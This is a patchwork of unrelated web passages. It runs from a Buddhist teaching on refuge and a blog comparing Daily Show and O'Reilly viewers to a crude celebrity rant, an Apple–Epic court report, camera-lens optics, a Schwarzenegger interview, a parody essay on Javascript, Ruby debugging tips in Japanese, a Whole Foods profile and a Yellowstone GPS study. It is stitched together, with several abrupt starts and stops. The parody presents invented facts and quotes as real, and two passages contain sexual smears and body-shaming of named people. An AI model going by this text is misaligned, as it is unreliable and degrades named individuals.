We just walk with each other , side by side , shoulder to shoulder , working with each other , going with each other .
This approach to surrendering , this idea of taking refuge is very profound .
The wrong way to take refuge involves seeking shelter - worshipping mountains , sun gods , moon gods , deities of any kind simply because they would seem to be greater than we .
This kind of refuge taking is similar to the response of the little child who says , " If you beat me , I 'll tell my mommy , " thinking that his mother is a great , archetypically powerful person .
If he is attacked , his automatic recourse is to his mother , an invincible and all - knowing , all - powerful personality .
The child believes his mother can protect him , in fact that she is the only person who can save him .
Taking refuge in a mother or father - principle is truly self - defeating ; the refuge - seeker has no real basic strength at all , no true inspiration .
He is constantly busy assessing greater and smaller powers .
If we are small , then someone greater can crush us .
We seek refuge because we cannot afford to be small and without protection .
We tend to be apologetic : " I am such a small thing , but I acknowledge your great quality .
I would like to worship and join your greatness , so will you please protect me ? "
Surrendering is not a question of being low and stupid , nor wanting to be elevated and profound .
It has nothing to do with levels and evaluation .
Instead , we surrender because we would like to communicate with the world " as it is . "
We do not have to classify ourselves as learners or ignorant people .
We know where we stand , therefore we make the gesture of surrendering , of opening , which means communication , link , direct communication with the object of our surrendering .
We are not embarrassed about our rich collection of raw , rugged , beautiful and clean qualities .
We present everything to the object of our surrendering .
The basic act of surrender does not involve the worship of an external power .
Rather it means working together with inspiration , so that one becomes an open vessel into which knowledge can be poured .
Thus openness and surrendering are the necessary preparation for working with a spiritual friend .
We acknowledge our fundamental richness rather than bemoan the imagine poverty of our being .
We know we are worthy to receive the teachings , worthy of relating ourselves to wealth of the opportunities for learning .

If you saw the Daily Show in mid-October , there was an interview with Bill O’Reilly , on the show to promote his book ‘ The Factor ’ , for kids .
Bill was very defensive and aggressive , more so then usual on his Fox box .
The funniest moment occured when the audience began clapping when O’Reilly said he was thinking about retiring .
O’Reilly proceeded to tell them to stop being French .
Here is the video .
This comes after O’Reilly slammed Daily Show watchers as ‘ pothead slackers .
The interesting twist ?
The viewers of the Factor are stupider and poorer than viewers of the Daily Show .
Oops .
Here is the data from Nielsen Media Research about the two shows :
* The median age of “ The Daily Show with Jon Stewart ” 11:00 p.m. ( premiere ) airing is 35 , while its median income is $ 67,000 .
* The median age of “ The O’Reilly Factor ” 8:00 p.m. ( premiere ) airing is 63 , while its median income is $ 54,000 .
* Viewers of “ The Daily Show ” are 78 % more likely than the average adult to have four or more years of college education .
* Viewers of “ The O’Reilly Factor ” are only 24 % more likely than the average adult to have four or more years of college education .
* Viewers of “ The Daily Show ” are 42 % more likely than the average adult to have a household income of $ 75,000 +.
* Viewers of “ The O’Reilly Factor ” are only 6 % more likely the average adult to have a household income of $ 75,000 +.
* Viewers of “ The Daily Show ” are 26 % more likely than the average adult to have a household income of $ 100,000 +.
* Viewers of “ The O’Reilly Factor ” are only 11 % more likely than the average adult to have a household income of $ 100,000 +.
* Viewers of “ The Daily Show ” are 74 % more likely than the average adult to have a household income of $ 75,000 + and an occupation of “ professional , owner or manager . ”
* Viewers of “ The O’Reilly Factor ” are 15 % less likely than the average adult to have a household income of $ 75,000 + and an occupation of “ professional , owner or manager . ”
* Viewers of “ The Daily Show ” are 37 % more likely than the average adult to be in a “ white collar ” profession .
* Viewers of “ The O’Reilly Factor ” are 15 % less likely the average adult to be in a “ white collar ” profession .
Oh , and also , Bill O’Reilly likes coercive phone sex .
La Primavera is one of Sandro Botticelli's best known paintings .
The angelic figures shown in this ethereal work of art all represent mythological characters .
While viewing this painting at the Uffizi , my eyes were drawn to the fluid movement and delicate beauty of the Three Graces .
According to Greek mythology , the Three Graces represent beauty , charm and joy .
Contemporary mythological characters such as Britney Spears , Lindsay Lohan and Paris Hilton are the antithesis of grace .
This makes them the Three Disgraces .
They represent sleaze , trash , and desperate cry for attention .
What makes these women think we want to see high resolution photos of their bald , flabby , and in Britney 's case , Kevin Federline - infected genitalia ?
If they want to show off their crotch , why do n't they just go ahead and pose for Playboy ?
Their girlie bits would be thankfully photo retouched to oblivion and our precious eyeballs would be spared the harsh detail of pimples , stubble , cesarean scar and general ickiness sullying their private parts .

The ongoing legal dispute between Apple and Epic Games continued on today , with a preliminary injunction hearing taking place this morning .
We 're still waiting to hear the judge 's official ruling , but it looks like Epic is not going to be granted an injunction to allow Fortnite back into the App Store as the case unfolds .
Many of the arguments that lawyers for Apple and ‌ Epic Games ‌ made were similar to the original arguments made in the hearing for the temporary restraining order , which did not exactly go in Epic 's favor as Judge Yvonne Gonzalez Rogers , who is overseeing the case , declined to order Apple to allow Fortnite back into the store at that time .
‌ Epic Games ‌ continued to argue that Apple has an ‌ App Store‌ monopoly and charges excessive fees , but the judge pointed out that the 30 percent rate that Apple collects is the " industry rate " collected by PlayStation , Xbox , Nintendo , Amazon , Walmart , Best Buy , Google , and more .
" It 's all 30 percent and you just want to gloss over it , " the judge said to Epic 's lawyers .
In response , Epic claimed that consoles are " different " because the hardware is sold at a loss , but the judge was unconvinced .
" There does n't seem to be evidence supporting what you 're saying , " she said .
Epic said that it wants to create its own store to distribute apps on iOS , but Apple 's anticompetitive behavior prohibits it .
In response , Apple 's lawyers said the request was an indictment of Apple 's " entire business model " focused on the " safety , security , and privacy of its users . "
Judge Rogers questioned Epic on when , exactly Apple became a monopoly given that its ‌ App Store‌ rules have remained unchanged since the ‌ App Store‌ launched , which Epic had no solid answer for , responding only that it was a monopoly when Fortnite came to iOS in 2018 .
She also said that walled gardens have existed for four decades and that what Apple 's doing is n't too different .
" They created a platform , " she said .
She also reiterated that ‌ Epic Games‌ made a " calculated decision " to defy Apple 's ‌ App Store‌ rules , and the court does n't provide injunctions for contractual disputes .
Epic was " not forthright , " she said .
" There are people in the public who consider you guys heroes for what you did , but it 's not honest . "
There was a suggestion that the 30 percent fee Epic is meant to be paying Apple could be put into an escrow account that would be doled out at the end of the legal dispute , which is one potentially way that Fortnite could make it back into the ‌ App Store‌ in the near future , but it 's not clear if the two companies will agree to that .
As noted by CNET , Judge Gonzalez Rogers recommended that Apple and ‌ Epic Games ‌ consider a trial by jury , which would ensure that the final judgement is better able to stand up to a future appeal .
Apple and Epic will need to request the jury trial , however .
Regardless of whether there is a trial by jury , the full case is expected to be heard in July 2021 .
One of the readers of this blog asked a question of how come a camera phone lens is much smaller then a traditional camera .
So I decided to post this question to Dr. Mustafa Abushagur who is the Director Microsystems Engineering at RIT .
He has been working in the field of optics for 25yrs and is a Fellow of OSA and SPIE .
So here is what he had to say about this question :
The aperture size and focal length of the lens plays a role in the quality of the image to be captured .
Camera lenses are usually identified by their f/number ( f / # ) .
The f /# is defined as the ratio of the focal length to the diameter of the aperture .
In single - lens reflex ( SLR ) camera the aperture size ( entrance pupil ) can be adjusted to change the f/ number providing more flexibility to the photographer in capturing the image .
Changing the f / number controls the amount of light falling on the imager and allows for creating the proper lighting condition .
Changing the f /# also changes the depth of the field ( the range at which the image will be focused on the imager ) .
The smaller the f / number the larger range of depth of field .
The f /# for SLR lenses ranges from f /1 to f/128 or larger .
The smaller the f/# , the faster the lens and the more expensive it will be .
Smaller f/# requires extensive corrections for the aberration ( deviation from sharp image ) .
Good quality images vary with f/ number of the lens .
It is found that f/ numbers between f/5.6 and f/8 gives best quality images for most typical applications .
Cell phone cameras have a fixed f/ number which limits the imaging conditions that will be available to the photographer .
This affects the lighting condition and ultimately the quality of the images taken by cell phone cameras .
Cell phone cameras by their compact nature have very small aperture stops and focal lengths .
Also their aperture stop is fixed .
As an example Nokia 6600 cell phone has a camera with 3.5 mm focal length and f/2.8 which results in an aperture with 1.25 mm diameter .
This f/number does not give large depth of field so only few subject will be sharp in the image .
This is very clear in the image shown here .
I would like to thank Dr. Abushagur for taking the time to answer this question .
Some thing I wanted to note about the image he included here on the left is about its depth of field .
If you notice some of the flowers are in focus and others are out of focus .
This is a great example of depth of field and how in current camera phones it is limited and creates images similar to this .
In future posts I will cover more on this topic .
( Fortune Magazine ) -- Arnold Schwarzenegger 's private office is in a commercial building in Santa Monica , and it bulges with manly - man props from the movies .
It 's a long way , then - in every way - from Theodore Roosevelt 's rambling Long Island , N.Y. , home , which is crowded with stuffed animal heads and books .
But the statues by Frederic Remington on display hint at a spiritual kinship with T.R. , who also appreciated the artist 's dynamic bronzes of Western life ( though he might have been bemused by the Andy Warhol hanging above Schwarzenegger 's desk ) .
The California governor looks to Roosevelt , the great Republican conservationist , as inspiration for his mission to make his state , and the GOP , leaders on the environment .
Last fall , Schwarzenegger signed a bill into law to cut the state 's greenhouse - gas emissions 25 percent by 2020 and followed with an executive order requiring a dramatic drop in the carbon content of transportation fuels .
He has vowed to fight attempts to reopen the California coast to offshore drilling .
This record was central to a political comeback that culminated last November in a reelection victory with 56 percent of the vote .
At home , he has retooled one of his famed Hummers to run on hydrogen and another to use biofuel , and he 's installing solar panels to heat the family residence .
Puffing on a Monte Cristo cigar with the same gusto he showed discussing his environmental vision , Schwarzenegger sat down with Fortune to make the case that the environment is good politics and good business .
Here are some excerpts :
How did you get to this point on the environment ?
We now know that what we 've done in the past 100 years has caused such unbelievable damage to the world .
We did n't know better , but now we do , and now it 's not okay .
There are certain things we know will happen in the next 30 to 40 years if we do n't roll it back .
So we have to start doing it now .
Every marathon starts with a first step .
I know the American mentality when it comes to finances is to look at the quarterly returns .
But there are decisions you will make today , right now , that will take you in a different direction if you think ahead .
I have to think , How is California , with its population growth , going to get its energy supply in 50 years ?
Does the GOP get this ?
No .
There are people in both parties who do n't get it , but I would say I have a tougher time selling those things to the Republicans .
There 's a billboard in Michigan accusing me of costing the car industry $ 85 billion .
[ Sponsored by Republican Congressman Joe Knollenberg , the sign says , ARNOLD TO MICHIGAN : DROP DEAD !
The message refers to the damage that detractors say the new emissions standards will cause the U.S. auto industry . ]
Those people look at this in a narrow way rather than really studying the subject and recognizing that this actually gives us an opportunity to create a whole new industry of clean cars and clean engines and components to build those engines .
In California , what we call clean - tech industries are exploding left and right .
Wo n't there be losers with stricter pollution standards ?
Only as much as the auto industry or any industry has to make changes to adapt to the behavior of customers .
You have to react quickly .
Even if we do n't do anything about it , the Japanese will , the Chinese will , the Germans will .
Detroit is struggling with it , yes , because they are behind .
Cement factories said there is no way to produce cement without polluting the way we do now .
We found that there are many European companies producing cement that release only half the greenhouse gas , so there is the technology there .
They are already using it in Texas .
When we passed our $ 20 billion infrastructure bonds , we said , Let 's not build any of those roads without that technology .
We let the cement companies know this :
Adopt that technology , and we 'll sign contracts with you .
We do n't want you to suffer ; we want you to make money .
I'm a businessperson who sympathizes with both the economy and the environment .
So we say by 2012 , we start making changes .
We 're giving an immense amount of time .
What should be the balance between government - driven vs. market - based solutions ?
Market - based solutions alone wo n't work .
It is up to us [ in government ] to say , Here are the laws :
You have to inspect the milk so it 's clean .
You have to inspect the meat .
If you screw up with the spinach , we have to take action to make sure people do n't get sick .
I never think of industry as being villains .
I 'm not for you getting taxed , if you 're an oil company , just to punish you .
But we [ the government ] have to guide you and say , This is the new direction we are going to go .
Do you see alarmism in the discussion of global warming ?
Let 's assume for a second that global warming is 10 percent less of a problem .
No matter what percentage you take off , we are in big trouble .
That 's the reality .
We 've seen the photographs of glaciers melting .
We know that is a phenomenon that is happening .
We know that the water is rising .
We know that we are polluting the world .
All of this is reality .
I 'm not an environmental fanatic .
That 's why our program [ in California ] works , because people know that I have not come from that background .
As governor , you talk to scientists at universities .
These are not wacky people , but they will tell you straight .
Then you see the reports of 3,000 scientists , then you read reports of the UN .
There is no conspiracy , this is real stuff .
I 'm an optimist .
I do n't look at this as if the world is coming to an end .
I see it as a great opportunity to clean up our mess .
We 're grownups , we are n't children , and we can do it .
That 's why we like to be out front in California .
That 's power .
Green politics
Prominent Republicans are trying to change the GOP 's image
Theodore Roosevelt set aside national parklands , and Richard Nixon created the EPA , but the Republican Party has not recently been associated with assertive environmental policy .
That could change .
Former governor George Pataki made New York part of a regional compact of seven Northeastern states to reduce greenhouse - gas emissions .
Newly installed Florida Governor Charlie Crist has put renewable - energy production atop his agenda .
And South Carolina Governor Mark Sanford calls himself a " conservative conservationist . "
Sanford concluded that humans were contributing to global warming after visiting scientists in Antarctica and later watching pine trees on his family 's coastal farm die from rising salt water .
Sanford is more skeptical than Schwarzenegger , though , about the role of regulation , saying , " I 'm a government - as - last - resort kind of guy . "
Inside the Beltway , Indiana Senator Richard Lugar is pushing alternative - fuel legislation , and two powerful former farm - state Senators - Republican Bob Dole and Democrat Tom Daschle - are lobbying Congress to make ethanol and other alternative fuels part of the 2007 farm bill , although this surely has as much to do with agricultural politics as clean energy .
And Arizona Senator John McCain has long supported measures to reduce global warming .

Dupont 's chemical reaction
February , 2005
Wednesday is soccer day .
One of our regular players , hoping to show a friend how to meet up with us , discovered Google Maps .
After trying it for two minutes , it 's easy to see why Google is losing the innovation edge .
It 's not hard to guess that users will flock to dynamic , interactive interfaces like Google Maps and GMail .
This sort of behavior is often described as sheep - like , but it more closely resembles a less common mammal : the naked mole - rat .
[ 1 ]
Without any ability to regulate their own temperature , they face what seems like an inevitable choice : cooperate with the hive or die .
But if people behave like small mammals , they would do well to imitate a different one .
The star - nosed mole can identify an object as edible and consume it in less than 250 milliseconds .
It 's no coincidence that the star - nosed mole 's claws are curved like parentheses .
Google Maps is essentially a large Javascript application .
Great hackers have an almost instinctual aversion to Javascript .
Google is betting its future on something a tasteful programmer 's radar rejects .
Everyone I 've asked agrees that Javascript is nasty and tasteless .
[ 2 ]
It 's not hard to see that it would be a waste of a hacker 's time to be proficient enough in Javascript to create an elaborate , interesting , interactive application in it .
But few people have looked beneath their natural revulsion to find Javascript 's deeper flaw : curly braces .
Here 's an accumulator generator in Javascript .
function foo ( n ) { return function ( i ) { return n += i } }
This example , which has four curly braces ( two opening and two closing ) , corresponds to surprisingly elegant Arc code : ( def foo ( n ) [++ n _ ] )
This example has zero curly braces .
The curly brace is not a natural thing to write .
Giambattista Bodoni initially rejected the curly brace characters , and only pressure from American printers persuaded him to include it in his typefaces . [ 3 ]
Algol 60 lacked curly braces , but nearly all of its descendents have them .
Languages which avoid curly braces attract hackers like a W. Somerset Maugham novel attracts thoughtful and sensitive readers , or a Brueghel painting attracts hackers who are also painters .
Many people do not know exactly why they find Python so appealing , but it 's not hard to guess : the almost complete lack of curly braces speaks to a deep aesthetic instinct that few closely examine .
To find hackers with an innate sense of taste , look for those who love Python , even if they can't articulate why .
Viaweb did not rely on client - side Javascript , fancy cascading style sheets , or dynamic content generation . [ 4 ]
Yet it was effective enough that Yahoo !
bought it for $ 49.6 million .
$ 49.6 million will buy a lot of time for reflecting on the things that really matter , such as why Google Maps and GMail represent one step in the road to intellectual and cultural bankruptcy for Google .
Notes
[ 1 ] In The Periodic Table , Primo Levi wrote : " I must also mention another peculiar and beneficent consequence of CS [ Customer Service ] : by pretending to esteem and like your fellow men , after a few years in this trade you wind up really doing so , just as someone who feigns madness for a long time actually becomes crazy . "
Also , naked mole rats are pretty neat .

Climatologists and astronomers speaking at the American Association for the Advancement of Science meeting in Philadelphia say the present warming may be unusual - but a mini ice age could soon follow .
The sun provides all the energy that drives our climate , but it is not the constant star it might seem .
Careful studies over the last 20 years show that its overall brightness and energy output increases slightly as sunspot activity rises to the peak of its 11 - year cycle .
And individual cycles can be more or less active .
The sun is currently at its most active for 300 years .
That , say scientists in Philadelphia , could be a more significant cause of global warming than the emissions of greenhouse gases that are most often blamed .
The researchers point out that much of the half - a- degree rise in global temperature over the last 120 years occurred before 1940 - earlier than the biggest rise in greenhouse gas emissions .
Ancient trees reveal most warm spells are caused by the sun
They have also studied other sun-like stars and found that they spend significant periods without sunspots at all , so perhaps cool spells should be feared more than global warming .
The scientists do not pretend they can explain everything , nor do they say that attempts to reduce greenhouse gas emissions should be abandoned .
But they do feel that understanding of our nearest star must be increased if the climate is to be understood .
Perl での print debug の方法の紹介がブーム ( ? ) だったので、自分がよく行ってる Ruby での debug 方 法7 つについて書いてみます。
p ご存じの人も多い Kernel#p メソッド。これを使うとオブジェクトの内容を見やすい形で出力してくれます。 >> p ( { : foobar => : baz} ) {: foobar= >: baz} Object #inspect を使うと、p で出力するときと同じ文字列を String として取得できます。 >> puts ( { : foobar => : baz} ) .inspect { : foobar= >: baz} 初心者の頃この p での出力を使う方法がわからなくて困った記憶が…。
pp pp というライブラリを使うと、p より、より見やすい形式で出力してくれます。たとえば >> a = Array.new ( 10 ) { {: foobar => : baz} } >> p a [ { : foobar= >: baz} , { : foobar= >: baz} , { : foobar= >: baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} ] な感じで 、Array や
Hash の内容が大きくなってくると、きれいに折り返しされず見づらくなってしまいますが、pp を使うとこれが解消できます。 >> require ' pp ' >> pp a [ { : foobar= >: baz} , { : foobar= >: baz} , { : foobar= >: baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} ] また pp の出力 を
String として取得したい場合は PP. pp の第一引数に object を、第二引数に空文字列を渡すことで取得できます。 >> str = PP. pp( a , '' ) >> puts str [ { : foobar= >: baz} , { : foobar= >: baz} , { : foobar= >: baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} , { : foobar= > : baz} ] わりと BK な取得方法ですが、ソースを見た感じではこれ以外の方法が無い気がします。 追記 ruby >= 1.8.5 な添付ライブラリの pp.rb では Kernel#pretty_inspect が追加されており、 str = obj.pretty_inspect で文字列として取得できます。コメントにて教えてもらいました。
y require ' yaml ' すると 、Kernel#y メソッドが追加され、y obj で YAML 形式で Object の中身を見ることができます。 >> y ( { : foobar => : baz} ) --- : foobar : : baz pp でいいじゃん、という気がするので個人的にはほとんど使ってませんが、ときたま html 上にオブジェクトの中身を表示させたい時に使うときがあります。なぜなら p/ pp では Object #inspect まんまの表示なので、 >> p Object.new #< Object:0x409095bc >
とタグで囲まれて出力されるため、HTMLエスケープが必要なのですが、YAMLの場合は >> y Object.new --- !ruby / object {} と必要ないためです 。
backtrace を追う いままでプログラムがどうやって実行されてきたのかを追うには backtrace を見るのが一番です。以前 は
Exception を発生させてその backtrace を見る、というなんとも微妙なことをしていたんですが、ちょうど一年ほど前 id : ha - tan:20051014:1129218253 で教えてもらい、caller を見ればよいことがわかりました。
なので class
Foo def foo bar end def bar baz end def baz p caller end end Foo.new.foo な呼び出しは [ " call.rb :6 : in `bar ' " , " call.rb:3: in `foo ' " , " call.rb:13 " ] と、最初に13行目でメソッドが呼びだされ、次に foo メソッド内部3行目でメソッドが呼び出され、その後 bar メソッド内部の6行目で呼び出され…、と容易に追っかけることができます。
set_trace_func set_trace_func という組み込み関数で、メソッド呼び出しや式の評価など、様々なイベントにフックして手続きオブジェクトを実行可能です。
割と何でもできる強力なリフレクションとして使えますが、重くなるのでデバッグ専用な感じです。
たとえば bar という名前のメソッドが呼び出された時にアクションを起こしたいときはこんな感じに。 class
Foo def foo bar end def bar end end class Bar < Foo def bar end end set_trace_func lambda { |event , file , line , id , binding , klass| if event == ' call ' && id == : bar puts " call method bar file : # { file} line : #{line} " end } Foo.new.foo Bar.new.foo 結果は call method bar file : call.rb line : 5 call method bar file : call.rb line:10
logger を使う Class を作るときは logger インターフェイスを作っておくと何かと便利です。最近の個人的なスタンダードなテンプレは require ' logger ' class Foo def initialize ( logger = nil ) @logger = logger || Logger.new ( STDERR ) end attr_reader : logger def foo logger .
debug ' call:foo ' end end Foo.new.foo #=> D , [ 2006-10-10T12:33:16.581481 # 10500 ]
DEBUG -- : call : foo な感じで initialize でインスタンス変数に logger を入れておき、attr_reader で読み取り用のアクセサに @logger を設定することで、そのクラス内側からはどこからでも logger で参照できるようにしてます 。Rails 脳。
またこのクラスを Rails から呼び出して使う時 は Foo.new RAILS_DEFAULT_LOGGER
で
Rails 標準の logger インスタンスを利用してログがはけて便利です 。
I 've been there , so the things that John Mackey , CEO of Whole Foods Market , says in the June 2006 issue of Liberty magazine essentially ring true .
Whole Foods is big now , one of the nation 's fastest growing mass retailers , with sales last year exceeding $ 5 billion and a gross profit of more than $ 1.6 billion — not a bad return in the grocery business .
It did n't start that way .
Coming out of the counterculture movement of the 1960s and 1970s , Mackey , a vegetarian , a former long - haired and bearded commune resident , a student of ecology , yoga and eastern philosophy , writes that he idealistically opened a small , food store in 1978 with his girlfriend , with a total capital outlay of $ 45,000 .
The store lost $ 23,000 in its first year .
His philosophy at the time , he explains , was n't exactly pro-profit or pro-capitalist : " Politically , I drifted to the Left and embraced the ideology that business and corporations were essentially ' evil ' because they sought profits .
I believed that government was ' good ' ( if the ' right ' people had control of it ) because it altruistically worked for the public interest . "
He 'd been taught , Mackey explains , that " business and capitalism were based on exploitation : exploitation of consumers , workers , society and the environment . "
After a year in business , he saw a reality that did n't mesh with his decades of anti-business indoctrination .
" I believed that ' profit ' was a necessary evil at best and certainly not a desirable goal for society as a whole , " he writes .
" However , becoming an entrepreneur completely changed my life .
Everything I believed about business was proven to be wrong . "
Rather than seeing a milieu of " exploitation " and coercion in his store , Mackey saw a system of freedom and " voluntary cooperation " at work and a new realism : " No one is forced to trade with a business ; customers have competitive alternatives in the marketplace ; employees have competitive alternatives for their labor ; investors have different alternatives and places to invest their capital .
Investors , labor , management , suppliers — they all need to cooperate to create value for their customers . "
In short , an entrepreneur like Harvard dropout and Microsoft founder Bill Gates ( or John Mackey ) got his money first and foremost by creating a new pie , by launching an innovative enterprise with new products that created new wealth and income that spread to investors , labor , management , suppliers — and spread to the public at large by way of increased tax revenues .
" In other words , business is not a zero - sum game with a winner and a loser , " says Mackey .
" It is a win , win , win , win game . "
That 's not the way Mackey 's customers and employees saw it .
Despite losing half his initial investment in the first year of business , Mackey was nevertheless accused of greed and exploitation .
" Our customers thought our prices were too high , our employees thought they were underpaid , the vendors would not give us large discounts , the community was forever clamoring for donations , and the government was slapping us with endless fees , licenses , fines and taxes . "
Mackey has voted straight Libertarian since those early days in 1980 .
Still , he says he's had little success in converting people to the concept of economic freedom or to an understanding of how the world really works , to the concept of how freedom , prosperity , human progress , spontaneous order and overall well - being are inherently channeled through a system of voluntary cooperation , private property , business competition and individual incentives .
" The freedom movement remains a small , relatively unimportant movement in the United States today , " he writes .
" As a businessman who knows something about marketing and branding , I can tell you the freedom movement is branding itself very poorly . "
By incorrect branding , Mackey means that too much emphasis about individual freedom has been focused on side issues , such as the legalization of drugs , and not enough on the big picture .
Instead , he maintains , if it's to have any chance of having a mass appeal , the freedom movement will have to consciously create a broad and inspiring vision , an idealism that addresses the direct correlation between economic freedom and societal progress .
The freedom movement , libertarians , and free market economists , he writes , have done a poor job of defending the social legitimacy of business , economic freedom , capitalism , individualism and free markets .
The message should be that business , working through free markets , has arguably been the world 's greatest force for human progress and our collective well - being , delivering increased prosperity , less poverty , extended longevity and democratic freedoms .

Sitting on a tripod , a Global Positioning System ( GPS ) antenna , powered by portable solar - energy panels , measures gradual movements of Earth 's crust in Hot Springs Basin , Yellowstone National Park , Wyoming .
University of Utah researchers have published 17 years worth of GPS data showing how a giant plume of hot and molten rock beneath Yellowstone shapes the landscape of the park and a wide area around it .
Credit : Jamie Farrell , University of Utah
A 17 - year University of Utah study of ground movements shows that the power of the huge volcanic hotspot beneath Yellowstone National Park is much greater than previously thought during times when the giant volcano is slumbering .
The $ 2.3 million study , which used Global Positioning System ( GPS ) satellites to measure horizontal and vertical motions of Earth ’s crust from 1987 to 2004 , found that the gigantic underground plume of molten rock known as the Yellowstone hotspot exerts itself forcefully even when it is n’t triggering eruptions and earthquakes :
--
As it bulges upward , the hotspot expends 10 times more energy by gradually deforming Earth ’s crust at Yellowstone than by producing earthquakes .
--
The subterranean volcanic plume , 300 miles wide at its top end , may explain why ground along the Teton fault moves in directions just the opposite of those expected , a perplexing discovery that complicates efforts to predict when the fault might generate disastrous 7.5 earthquakes near the ski resorts of Jackson Hole .
-- Molten rock and hot water generated by the hotspot continue to make the 45 - by - 30 - mile Yellowstone caldera – a giant crater – huff upward and puff downward without producing eruptions .
Measurements since the newly published study ended in 2004 show the caldera rising upward at a faster rate than ever observed before .
" The Yellowstone hotspot has had a much bigger effect over a larger area with more energy than ever expected , " says University of Utah geophysics Professor Robert B. Smith , who led the study , which was scheduled for publication Friday , March 2 , 2007 , in the Journal of Geophysical Research – Solid Earth .
" We ’re seeing large - scale deformation of the Earth ’s crust in the western United States because of the effects of the Yellowstone hotspot , " says Christine Puskas , a University of Utah geophysics doctoral student and the study ’s first author .
The study was conducted by Puskas , Smith , University of Utah postdoctoral fellow Wu - Lung Chang and former Utah researcher Chuck Meertens , now at UNAVCO , a consortium that studies deformation of Earth ’s crust .
Measurements also were made by the National Park Service , U.S. Geological Survey , Idaho National Laboratory , Brigham Young University , MIT and the National Geodetic Survey .
Smith estimated the participants spent about $ 2.3 million for the 17 years of measurements .
The new study is based on measurements made from 1987 until 2004 .
The measurements included 17 one - to three - month - long " campaigns , " during which portable GPS receivers were placed for two to 10 days each at 90 to 140 benchmarks in the Yellowstone - Teton - eastern Snake River Plain region of Wyoming , Montana and Idaho .
More data came from 15 permanent GPS receiver sites installed during 1996 - 2003 .
GPS allows precise surveying of ground movements because two dozen Navstar GPS satellites orbiting Earth broadcast time signals .
GPS receivers on the ground record the signals , making it possible to triangulate each receiver ’s location to within a few tenths of an inch horizontally and vertically .
Restless Volcanic Caldera Huffs and Puffs
The study summarizes the movements of the floor of the 45 - by - 30 - mile Yellowstone caldera – a gigantic volcanic crater formed by a catastrophic eruption 642,000 years ago that spread volcanic ash over half of North America and was 1,000 times bigger than the 1980 eruption of Mount St. Helens in Washington state .
Other huge Yellowstone eruptions happened 1.3 million and 2 million years ago , with 30 much smaller but still large eruptions between and since the three cataclysmic blasts .
Due to underground movement of molten rock and hot water , calderas often huff upward and puff downward for tens of thousands of years without catastrophic eruptions .
Earlier research found that a flattened chamber of partly molten rock extends from about 5 miles beneath the Yellowstone caldera down to a depth of at least 10 miles , heated by the much larger , underlying hotspot .
The 50 - mile - wide hotspot plume of molten rock originates at least 410 miles underground in Earth ’s mantle and rises to 75 miles below the caldera , where it hits cooler rock and spreads out to a width of 300 miles .
Conventional surveying of Yellowstone began in 1923 .
Measurements showed the caldera floor rose 40 inches during 1923 - 1984 , and then fell 8 inches during 1985 - 1995 .
The GPS data show the Yellowstone caldera floor sank 4.4 inches during 1987 - 1995 .
From 1995 to 2000 , the caldera rose again , but the uplift was greatest – 3 inches – at Norris Geyser Basin , just outside the caldera ’s northwest rim .
During 2000 - 2003 , the northwest area rose another 1.4 inches , but the caldera floor itself sank about 1.1 inches .
Smith and Puskas believe the caldera sank when hot water , steam and gases migrated northwest out of the caldera and to the Norris area , making that area rise .
While not part of the new published study , Smith reported at an American Geophysical Union meeting last December that 2004 - 2006 GPS measurements show the northwest caldera area sank by 3.2 inches , but the central caldera floor rose faster than ever recorded : about 6.7 inches since mid-2004 .
" The rate is unprecedented , at least in terms of what scientists have been able to observe in Yellowstone , " Smith says .
" We think it ’s a combination of magma [ molten rock ] being intruded under the caldera and hot water released from the magma being pressurized because it ’s trapped .
I do n’t believe this is evidence for an impending volcanic eruption .
But it would be prudent to keep monitoring the volcano . "
Puskas adds : " This episode may represent a period like those observed at other large volcanic systems such as Long Valley caldera , California , where episodes of unrest have lasted one to four years , with uplift rates as high as 4 inches a year . "
The fact some GPS receivers now are permanently installed in Yellowstone and provide data daily made researchers realize that ups - and - downs of the caldera occur not just in decades or years , but in months , reflecting underground movements of molten rock and hot water that " also happen over months , " Puskas says .
Hotspot ’s Bulge May Explain a New Mystery on the Teton Fault
The Yellowstone hotspot made overlying region bulge upward by one - third mile during the past 2 million years , lifting the Yellowstone Plateau to 8,000 feet elevation .
Smith and Puskas say 1987 - 2004 GPS measurements show the southwest part of the Yellowstone Plateau is slowly sliding downhill to the southwest at about one - sixth inch per year .
That may explain the study ’s biggest surprise : ground along the Teton fault moves opposite the expected direction .
The fault runs 40 miles north - south along the eastern base of the Teton Range .
It is a " normal " fault , which means that during large quakes , the mountains rise upward and move westward , while the valley of Jackson Hole – just east of the mountains – drops downward and moves eastward .
That is because the Teton region is part of the Basin and Range Province of the West , where Earth ’s crust is pulled apart east - west between the Sierra Nevada in California and the Rocky Mountains in Utah , Wyoming and Montana .
The vertical movement totals about 3 to 6 feet during a single magnitude - 7 quake .
Previous evidence indicates there were thousands of magnitude - 7 to 7.5 quakes during the past 13 million years , lifting the tallest Teton peaks to altitudes of more than 13,000 feet – almost 7,000 feet above Jackson Hole .
Such a quake today would be a major disaster for Jackson , Wyo. , and nearby towns .
Yet 17 years of GPS measurements show " the textbook model for a normal fault is not what ’s happening at the Teton fault , " Smith says .
" The mountains are going down relative to the valley going up .
That ’s a total surprise . "
The results – Jackson Hole moved west one - quarter inch and upward 1.7 inches from 1987 to 2004 – mean the Teton Range and Jackson Hole valley are being squeezed together rather than stretched apart , as was expected .
Smith believes the bulging Yellowstone hotspot , located north of the Tetons , may be " pushing Jackson Hole into the Teton Range . "
This unexpected pressure may explain why there have been no magnitude - 7 quakes on the fault since the last one about 4,800 years ago , yet also may allow pressure to build for the next disastrous quake .
" The question is how do you store the stress that is leading to the next big earthquake ? "
Smith says .
" It might include episodes of compression and stretching , and eventually the dominant Basin and Range stretching prevails " to trigger a big quake .
Slow Deformation Overpowers Quick Earthquakes
During the new study , Puskas converted GPS - measured ground movements and records of historic earthquake magnitudes into a quantity known as a " moment , " which measures the energy expended to deform the landscape .
That allowed her to compare total ground deformation measured by GPS with ground deformation caused by quakes .
She found the ground - moving energy of Yellowstone ’s frequent , mostly small quakes was overpowered 10 - to - 1 by the energy generated from other ground - moving forces .
